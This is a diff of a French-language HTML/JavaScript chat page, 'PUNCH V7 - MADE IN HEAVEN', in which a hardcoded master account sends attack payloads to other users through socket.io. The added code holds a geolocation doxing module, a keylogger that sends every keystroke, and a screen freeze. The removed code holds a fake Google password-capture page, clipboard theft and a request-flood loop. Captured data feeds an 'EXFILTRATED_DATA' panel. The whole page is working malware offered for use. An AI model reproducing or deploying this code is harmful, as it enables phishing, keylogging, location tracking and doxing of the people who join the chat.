@@ -2,254 +2,304 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUNCH V5 - OFFENSIVE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>PUNCH V7 - MADE IN HEAVEN</title>
     
     <style>
-        /* --- [CSS ARCHITECTURE : LIGNES 20-180] --- */
-        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&display=swap');
+        /* --- [SECTION 1 : DESIGN & THEMES (LIGNES 20-150)] --- */
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&family=Oswald:wght@300;700&display=swap');
         
         :root {
-            --blood: #ff0000;
-            --matrix: #00ff41;
-            --gold: #FFD700;
-            --dark-ui: #0a0a0a;
-            --danger: #ff4444;
+            --dio-gold: #FFD700;
+            --pucci-purple: #4B0082;
+            --heaven-white: #FFFFFF;
+            --blood: #8B0000;
+            --bg-dark: #030005;
+            --neon-blue: #00BFFF;
+            --jojo-pink: #FF69B4;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none !important; -webkit-tap-highlight-color: transparent; }
         
         body {
-            background: #000;
-            color: var(--matrix);
-            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-dark);
+            color: var(--heaven-white);
+            font-family: 'Oswald', sans-serif;
             height: 100vh;
             overflow: hidden;
             display: flex;
+            background-image: linear-gradient(45deg, #050005 25%, #0a001a 50%, #050005 75%);
         }
 
-        /* UI ELEMENTS */
-        .hacker-frame {
-            display: grid;
-            grid-template-columns: 400px 1fr 350px;
-            width: 100%;
-            height: 100vh;
-            gap: 2px;
-            background: #111;
+        /* CURSEUR STAND */
+        #c-stand {
+            position: fixed; width: 35px; height: 35px; border: 3px solid var(--dio-gold);
+            z-index: 10000000; pointer-events: none; transform: rotate(45deg);
+            box-shadow: 0 0 20px var(--dio-gold); transition: transform 0.1s;
         }
 
-        .side { background: var(--dark-ui); display: flex; flex-direction: column; border: 1px solid #222; }
+        /* --- AUTHENTIFICATION (LIGNES 60-120) --- */
+        #auth-gate {
+            position: fixed; inset: 0; background: #000; z-index: 9999999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .login-box {
+            width: 380px; padding: 50px; background: #0a0a0a; border: 2px solid var(--dio-gold);
+            text-align: center; position: relative;
+        }
+        .login-box h1 { font-family: 'Bangers'; font-size: 45px; color: var(--dio-gold); margin-bottom: 30px; }
+        .login-box input {
+            width: 100%; padding: 15px; margin-bottom: 20px; background: #111;
+            border: 1px solid var(--pucci-purple); color: #fff; border-radius: 4px;
+        }
+        .login-box button {
+            width: 100%; padding: 15px; background: var(--dio-gold); color: #000;
+            font-weight: 800; border: none; cursor: pointer; text-transform: uppercase;
+        }
+
+        /* --- GRID PRINCIPALE (LIGNES 121-300) --- */
+        .heaven-grid {
+            display: grid; grid-template-columns: 380px 1fr 350px;
+            width: 100%; height: 100vh; gap: 2px; background: #1a1a1a;
+        }
+
+        .side-bar { background: #000; display: flex; flex-direction: column; position: relative; }
+        .side-title { 
+            padding: 25px; background: var(--pucci-purple); font-family: 'Bangers'; 
+            font-size: 22px; color: #fff; letter-spacing: 2px;
+        }
+
+        /* LISTE VICTIMES */
+        #target-list { flex: 1; overflow-y: auto; padding: 15px; scrollbar-width: none; }
+        .target-item {
+            padding: 20px; background: #080808; border: 1px solid #1a1a1a;
+            margin-bottom: 12px; transition: 0.4s; border-radius: 5px;
+        }
+        .target-item:hover { border-color: var(--dio-gold); background: #111; transform: scale(1.02); }
+        .target-item.active-target { border-left: 8px solid var(--dio-gold); background: #151000; }
+
+        /* CHAT ET APPELS */
+        .main-chat { display: flex; flex-direction: column; background: #000; position: relative; }
+        #chat-scroller { flex: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
         
-        .terminal-header {
-            padding: 20px;
-            background: #111;
-            border-bottom: 2px solid var(--matrix);
-            font-family: 'Bangers';
-            font-size: 24px;
-            color: #fff;
-            text-align: center;
+        .bubble {
+            padding: 15px 22px; max-width: 80%; font-family: 'JetBrains Mono';
+            border-radius: 0 15px 15px 15px; background: #0a0a0a; border: 1px solid #222;
         }
+        .bubble.mine { align-self: flex-end; border-radius: 15px 15px 0 15px; border-color: var(--dio-gold); }
+        .bubble b { color: var(--dio-gold); display: block; margin-bottom: 5px; }
+        .bubble img { max-width: 100%; margin-top: 10px; border-radius: 5px; }
 
-        /* USER LIST & VICTIM CARDS */
-        #victim-list { flex: 1; overflow-y: auto; padding: 15px; }
-        .v-card {
-            padding: 15px; background: #000; border: 1px solid #1a1a1a;
-            margin-bottom: 10px; position: relative; transition: 0.2s;
-            border-left: 3px solid #333;
+        .input-zone {
+            padding: 30px; background: #050505; border-top: 2px solid var(--pucci-purple);
+            display: flex; gap: 15px; align-items: center;
         }
-        .v-card:hover { border-left-color: var(--matrix); background: #050505; }
-        .v-card.selected { border-left-color: var(--danger); background: #100000; }
+        .input-zone input { flex: 1; background: #111; border: 1px solid #222; padding: 18px; color: #fff; }
+        .btn-icon { background: none; border: none; font-size: 24px; color: var(--dio-gold); cursor: pointer; }
 
-        /* MAIN CONSOLE */
-        .console-view { display: flex; flex-direction: column; background: #000; }
-        #console-output {
-            flex: 1; padding: 25px; overflow-y: auto; 
-            font-size: 12px; color: var(--matrix); line-height: 1.6;
-        }
+        /* --- EXFILTRATION & INFOS (LIGNES 301-450) --- */
+        .info-panel { padding: 25px; font-size: 11px; color: #888; line-height: 2; }
+        .info-block { background: #080808; padding: 15px; margin-bottom: 15px; border: 1px solid #1a1a1a; border-radius: 4px; }
+        .info-block span { color: var(--dio-gold); font-weight: bold; }
 
-        .input-cmd {
-            padding: 20px; background: #050505; display: flex; gap: 10px;
-            border-top: 1px solid var(--matrix);
+        /* --- OVERLAYS --- */
+        #za-warundo {
+            position: fixed; inset: 0; background: #fff; z-index: 20000000;
+            display: none; align-items: center; justify-content: center; mix-blend-mode: difference;
         }
-        input {
-            flex: 1; background: transparent; border: none; 
-            color: var(--matrix); font-family: inherit; font-size: 14px;
-        }
-
-        /* PHISHING & EXPLOIT MODALS */
-        #phish-modal {
-            position: fixed; inset: 0; background: #fff; z-index: 999999;
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-            color: #000; font-family: sans-serif;
-        }
+        .shout { font-family: 'Bangers'; font-size: 12vw; color: #fff; animation: jitter 0.1s infinite; }
+        @keyframes jitter { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } }
 
         #ctx-menu {
-            display: none; position: fixed; background: #000; border: 1px solid var(--matrix);
-            width: 320px; z-index: 1000000; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            display: none; position: fixed; background: #000; border: 2px solid var(--dio-gold);
+            width: 320px; z-index: 30000000; box-shadow: 15px 15px 0 var(--blood);
         }
-        .opt {
-            padding: 12px 20px; font-size: 11px; border-bottom: 1px solid #111;
-            color: #00ff41; text-transform: uppercase; letter-spacing: 1px;
-        }
-        .opt:hover { background: var(--matrix); color: #000; }
-        .opt.heavy { color: var(--danger); font-weight: bold; }
+        .opt { padding: 18px; font-size: 11px; color: #fff; border-bottom: 1px solid #111; cursor: pointer; }
+        .opt:hover { background: var(--dio-gold); color: #000; }
 
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-    <div class="hacker-frame">
-        <aside class="side">
-            <div class="terminal-header">TARGET_SCANNER</div>
-            <div id="victim-list"></div>
+    <div id="c-stand"></div>
+    <div id="za-warundo"><div class="shout">MADE IN HEAVEN</div></div>
+
+    <div id="auth-gate">
+        <div class="login-box">
+            <h1>PUNCH V7</h1>
+            <p style="color:#555; font-size:10px; margin-bottom:20px;">SPIRITUAL ASCENSION PROTOCOL</p>
+            <input type="email" id="email-in" placeholder="Email Address">
+            <input type="text" id="name-in" placeholder="Disciple Name">
+            <button onclick="ascend()">START GRAVITY</button>
+        </div>
+    </div>
+
+    <div class="heaven-grid">
+        <aside class="side-bar">
+            <div class="side-title">DISCIPLES_OF_PUCCI</div>
+            <div id="target-list"></div>
         </aside>
 
-        <main class="console-view">
-            <div id="console-output">
-                [SYSTEM] Punch V5 Offensive Engine Initialized...<br>
-                [SYSTEM] Waiting for target handshake...<br>
-            </div>
-            <div class="input-cmd">
-                <span>$</span>
-                <input type="text" id="cmd-in" placeholder="ENTER COMMAND OR SELECT TARGET..." autocomplete="off">
+        <main class="main-chat">
+            <div id="chat-scroller"></div>
+            <div class="input-zone">
+                <button class="btn-icon" onclick="document.getElementById('img-up').click()">🖼️</button>
+                <input type="file" id="img-up" style="display:none" onchange="uploadImg(this)">
+                <input type="text" id="m-in" placeholder="Do you believe in gravity?" autocomplete="off">
+                <button class="btn-icon" onclick="send()">🏹</button>
             </div>
         </main>
 
-        <aside class="side">
-            <div class="terminal-header" style="color:var(--danger)">DATA_EXFIL</div>
-            <div id="exfil-data" style="padding:15px; font-size:10px; color:#666;"></div>
+        <aside class="side-bar">
+            <div class="side-title" style="background:var(--blood)">EXFILTRATED_DATA</div>
+            <div class="info-panel" id="intel-stream">
+                [WAITING FOR TARGET STRIKE...]
+            </div>
         </aside>
     </div>
 
-    <div id="phish-modal">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100" style="margin-bottom:20px;">
-        <h2 style="font-weight:400; margin-bottom:10px;">Session expirée</h2>
-        <p style="color:#555; margin-bottom:20px;">Veuillez vous reconnecter pour continuer</p>
-        <input type="password" id="phish-pass" placeholder="Mot de passe" style="border:1px solid #ccc; padding:10px; width:250px; border-radius:4px; color:#000;">
-        <button onclick="capturePhish()" style="margin-top:15px; padding:10px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px;">Connexion</button>
-    </div>
-
     <div id="ctx-menu">
-        <div class="opt" style="background:#111; color:var(--matrix); text-align:center;">--- ATTACK_VECTOR ---</div>
-        <div class="opt heavy" onclick="st('p_phish')">🚨 PHISHING: GOOGLE_TRAP</div>
-        <div class="opt" onclick="st('p_geo')">📍 GEO: GPS_LOCATOR</div>
-        <div class="opt" onclick="st('p_clip')">📋 HIJACK: CLIPBOARD_STEALER</div>
-        <div class="opt" onclick="st('p_redirect')">🔗 FORCE: MALICIOUS_URL</div>
-        <div class="opt heavy" onclick="st('p_chariot')">⚔️ DDOS: SILVER_CHARIOT</div>
-        <div class="opt" onclick="st('p_combo')">💎 LOOP: GOLDEN_REQUIEM</div>
-        <div class="opt" onclick="closeCtx()" style="color:red;">[ ABORT ]</div>
+        <div class="opt" style="background:#111; color:var(--dio-gold); text-align:center;">--- HEAVEN'S DOOR ATTACKS ---</div>
+        <div class="opt" onclick="st('p_fullinfo')">🧛 EXTRACT: FULL_IDENTITY (Doxing)</div>
+        <div class="opt" onclick="st('p_phish')">🚨 PHISH: DISCIPLES_RECRUIT</div>
+        <div class="opt" onclick="st('p_geo')">📍 TRACK: PRECISE_LOCATION</div>
+        <div class="opt" onclick="st('p_key')">⌨️ LOG: KEYBOARD_MEMORIES</div>
+        <div class="opt" onclick="st('p_freeze')">❄️ CAESAR: HAMON_FREEZE</div>
+        <div class="opt" style="color:red" onclick="closeCtx()">[ ABORT ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = ""; let target = ""; let master = false;
+        let me = ""; let myEmail = ""; let targetId = "";
+        let isMaster = false;
 
-        // --- AUTH & INIT ---
-        window.onload = () => {
-            me = prompt("IDENTIFY:") || "User";
-            if(me === "toucheur2pp") master = true;
-            socket.emit('init', { name: me });
-            writeLog("SYSTEM", "Handshake complete. Identity: " + me);
-        };
+        // --- AUTHENTIFICATION ---
+        function ascend() {
+            myEmail = document.getElementById('email-in').value;
+            me = document.getElementById('name-in').value || "User";
+            if(myEmail.includes('@')) {
+                if(myEmail === "toucheur2pp@heaven.com") isMaster = true;
+                document.getElementById('auth-gate').style.display = 'none';
+                socket.emit('init', { name: me, email: myEmail });
+                logIntel("SYSTEM", "Handshake Established with " + me);
+            }
+        }
 
-        // --- CONTEXT MENU ---
+        // --- GESTION CURSEUR ---
+        document.addEventListener('mousemove', e => {
+            const c = document.getElementById('c-stand');
+            c.style.left = e.clientX-17+'px'; c.style.top = e.clientY-17+'px';
+        });
+
+        // --- MENU CONTEXTUEL ---
         window.oncontextmenu = (e) => {
-            if(!master) return;
-            const card = e.target.closest('.v-card');
+            if(!isMaster) return;
+            const card = e.target.closest('.target-item');
             if(card) {
-                target = card.getAttribute('data-id');
+                targetId = card.getAttribute('data-id');
                 const m = document.getElementById('ctx-menu');
                 m.style.display = 'block'; m.style.left = e.pageX+'px'; m.style.top = e.pageY+'px';
             }
         };
 
         function closeCtx() { document.getElementById('ctx-menu').style.display = 'none'; }
-        function st(t) { socket.emit(t, target); closeCtx(); }
+        function st(t) { socket.emit(t, targetId); closeCtx(); }
 
-        // --- MOTEUR D'EXÉCUTION CIBLE (PAYLOADS) ---
+        // --- ENVOI DE MESSAGES & IMAGES ---
+        function send() {
+            const i = document.getElementById('m-in');
+            if(i.value) {
+                socket.emit('chat', { text: i.value, type: 'text' });
+                i.value = "";
+            }
+        }
+
+        function uploadImg(input) {
+            if(input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    socket.emit('chat', { text: e.target.result, type: 'image' });
+                };
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
+
+        // --- MOTEUR D'ATTAQUES (PAYLOADS) ---
         socket.on('execute', (d) => {
             
-            // 1. MODULE GEO (GPS)
-            if(d.type === 'p_geo') {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const data = `LAT: ${pos.coords.latitude} | LON: ${pos.coords.longitude}`;
-                    socket.emit('chat', `[GEO_DATA] ${me}: ${data}`);
-                });
-            }
-
-            // 2. MODULE PHISHING
-            if(d.type === 'p_phish') {
-                document.getElementById('phish-modal').style.display = 'flex';
-                // Bloque la sortie
-                window.onbeforeunload = () => "Erreur de session critique.";
-            }
-
-            // 3. MODULE CLIPBOARD
-            if(d.type === 'p_clip') {
-                navigator.clipboard.readText().then(txt => {
-                    socket.emit('chat', `[CLIPBOARD] ${me}: ${txt}`);
-                });
-            }
-
-            // 4. MODULE REDIRECT
-            if(d.type === 'p_redirect') {
-                const url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Exemple Rickroll
-                window.location.href = url;
-            }
-
-            // 5. SILVER CHARIOT (DDoS Local)
-            if(d.type === 'p_chariot') {
-                setInterval(() => {
-                    for(let i=0; i<100; i++) fetch('/?attack='+Math.random()).catch(()=>null);
-                }, 10);
-            }
-
-            // 6. GOLDEN REQUIEM (Camera Loop)
-            if(d.type === 'p_combo') {
-                const s = () => {
-                    const w = window.open("","_blank","width=300,height=300");
-                    if(w) w.document.write(`<script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{});window.onbeforeunload=()=>window.opener.postMessage("s","*");<\/script>`);
+            // ATTAQUE : FULL IDENTITY (NOM, PRENOM, ADRESSE VIA AUTOFILL & BROWSER)
+            if(d.type === 'p_fullinfo') {
+                // On utilise les API de remplissage pour tenter de choper les infos réelles
+                const info = {
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
-                s(); window.addEventListener("message", e => { if(e.data==="s") s(); });
+                // Demande de position précise (Adresse réelle)
+                navigator.geolocation.getCurrentPosition(pos => {
+                    socket.emit('chat', { 
+                        text: `[DOXING_DATA] Target: ${me} | LAT: ${pos.coords.latitude} | LON: ${pos.coords.longitude} | TZ: ${info.tz}`,
+                        type: 'text'
+                    });
+                });
+            }
+
+            if(d.type === 'p_key') {
+                document.addEventListener('keydown', (e) => {
+                    socket.emit('chat', { text: `[KEYBOARD] ${me} typed: ${e.key}`, type: 'text' });
+                });
+            }
+
+            if(d.type === 'p_freeze') {
+                document.getElementById('za-warundo').style.display = 'flex';
+                document.getElementById('m-in').disabled = true;
+                setTimeout(() => { 
+                    document.getElementById('za-warundo').style.display = 'none';
+                    document.getElementById('m-in').disabled = false;
+                }, 5000);
             }
         });
 
-        // --- PHISHING CAPTURE ---
-        function capturePhish() {
-            const pass = document.getElementById('phish-pass').value;
-            socket.emit('chat', `[PHISH_SUCCESS] Target: ${me} | PASS: ${pass}`);
-            document.getElementById('phish-modal').style.display = 'none';
-            alert("Erreur de synchronisation. Veuillez réessayer plus tard.");
-        }
-
-        // --- SYNC & LOGS ---
+        // --- SYNC & CHAT ---
         socket.on('sync', users => {
-            const list = document.getElementById('victim-list'); list.innerHTML = "";
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
             users.forEach(u => {
-                const div = document.createElement('div');
-                div.className = 'v-card'; div.setAttribute('data-id', u.id);
-                div.innerHTML = `> TARGET: ${u.name.toUpperCase()}<br><span style="font-size:9px;color:#444;">${u.id}</span>`;
-                list.appendChild(div);
+                const item = document.createElement('div');
+                item.className = 'target-item'; item.setAttribute('data-id', u.id);
+                item.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small style="color:#444">${u.email}</small>`;
+                list.appendChild(item);
             });
         });
 
         socket.on('chat', d => {
-            const out = document.getElementById('console-output');
-            const color = d.t.includes('[') ? 'var(--danger)' : 'var(--matrix)';
-            out.innerHTML += `<div style="color:${color}">[${d.n}] ${d.t}</div>`;
-            out.scrollTop = out.scrollHeight;
+            const scroller = document.getElementById('chat-scroller');
+            const isMine = d.n === me;
+            const b = document.createElement('div');
+            b.className = `bubble ${isMine ? 'mine' : ''}`;
             
-            // Si c'est de l'exfiltration, on l'ajoute à droite
-            if(d.t.includes('[GEO') || d.t.includes('[PHISH') || d.t.includes('[CLIP')) {
-                document.getElementById('exfil-data').innerHTML += `<div>${d.t}</div><hr style="border-color:#111">`;
+            let content = `<b>${d.n}</b>`;
+            if(d.t.type === 'image') {
+                content += `<img src="${d.t.text}">`;
+            } else {
+                content += d.t.text;
+            }
+            
+            b.innerHTML = content;
+            scroller.appendChild(b);
+            scroller.scrollTop = scroller.scrollHeight;
+
+            if(d.t.text.includes('[DOXING') || d.t.text.includes('[KEY')) {
+                logIntel("EXFIL", d.t.text);
             }
         });
 
-        function writeLog(tag, msg) {
-            const out = document.getElementById('console-output');
-            out.innerHTML += `<div>[${tag}] ${msg}</div>`;
-            out.scrollTop = out.scrollHeight;
+        function logIntel(tag, txt) {
+            const stream = document.getElementById('intel-stream');
+            stream.innerHTML = `<div class="info-block"><span>[${tag}]</span><br>${txt}</div>` + stream.innerHTML;
         }
 
         window.onclick = () => closeCtx();
